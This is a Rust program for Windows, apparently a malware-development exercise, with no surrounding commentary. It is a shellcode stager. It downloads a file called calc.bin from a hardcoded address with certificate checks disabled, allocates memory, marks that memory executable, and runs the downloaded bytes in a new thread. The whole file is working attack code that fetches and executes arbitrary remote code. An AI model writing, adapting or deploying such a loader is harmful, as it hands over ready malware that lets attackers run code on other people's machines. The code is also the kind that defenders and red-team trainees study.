use std::{ffi::CString, intrinsics::copy_nonoverlapping, ptr};

use winapi::{
    ctypes::c_void,
    shared::minwindef::DWORD,
    um::{
        errhandlingapi::GetLastError,
        memoryapi::{VirtualAlloc, VirtualProtect},
        processthreadsapi::CreateThread,
        synchapi::WaitForSingleObject,
        wininet::{
            InternetCloseHandle, InternetOpenA, InternetOpenUrlA, InternetReadFile,
            INTERNET_FLAG_HYPERLINK, INTERNET_FLAG_IGNORE_CERT_CN_INVALID,
            INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        },
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
    },
};

fn get_payload(url: &str, buffer: &mut Vec<u8>, payload_size: &mut usize) -> bool {
    let c_url = CString::new(url).expect("Failed to convert URL to CString");

    unsafe {
        let internet_handle =
            InternetOpenA(std::ptr::null_mut(), 0, ptr::null_mut(), ptr::null_mut(), 0);
        if internet_handle.is_null() {
            println!("InternetOpenA failed with error: {}", GetLastError());
            return false;
        }

        let internet_file_handle = InternetOpenUrlA(
            internet_handle,
            c_url.as_ptr(),
            ptr::null_mut(),
            0,
            INTERNET_FLAG_HYPERLINK
                | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
                | INTERNET_FLAG_IGNORE_CERT_CN_INVALID,
            0,
        );

        if internet_file_handle.is_null() {
            println!("InternetOpenUrlA failed with error: {}", GetLastError());
            InternetCloseHandle(internet_handle);
            return false;
        }

        let mut total_size: usize = 0;
        let mut local_buf = [0u8; 4096];

        loop {
            let mut bytes_read: DWORD = 0;
            let ok = InternetReadFile(
                internet_file_handle,
                local_buf.as_mut_ptr() as *mut c_void,
                local_buf.len() as u32,
                &mut bytes_read as *mut DWORD,
            );

            if ok == 0 {
                println!("InternetReadFile failed with error: {}", GetLastError());
                InternetCloseHandle(internet_file_handle);
                InternetCloseHandle(internet_handle);
                return false;
            }

            if bytes_read == 0 {
                break;
            }

            buffer.extend_from_slice(&local_buf[..bytes_read as usize]);
            total_size += bytes_read as usize;

            if (bytes_read as usize) < local_buf.len() {
                break;
            }
        }

        *payload_size = total_size;

        InternetCloseHandle(internet_file_handle);
        InternetCloseHandle(internet_handle);
    }

    true
}

fn main() {
    let url = "http://172.26.116.194:8080/calc.bin";

    let mut buffer: Vec<u8> = Vec::new();
    let mut payload_size: usize = 0;

    if get_payload(url, &mut buffer, &mut payload_size) {
        println!("File downloaded successfully!");
    } else {
        println!("Failed to download the file.");
    }

    // println!("Buffer content: {:x?}", buffer);

    unsafe {
        let shellcode_address = VirtualAlloc(
            std::ptr::null_mut(),
            payload_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if shellcode_address.is_null() {
            println!("VirtualAlloc failed with error: {}", GetLastError());
            return;
        }

        copy_nonoverlapping(buffer.as_ptr(), shellcode_address as *mut u8, payload_size);

        let mut oldprotect = 0;

        let status = VirtualProtect(
            shellcode_address,
            payload_size,
            PAGE_EXECUTE_READ,
            &mut oldprotect,
        );

        if status == 0 {
            println!("VirtualProtect failed with error: {}", GetLastError());
            return;
        }

        let mut threadid = 0;

        let thread_handle = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(shellcode_address)),
            std::ptr::null_mut(),
            0,
            &mut threadid,
        );

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }
}
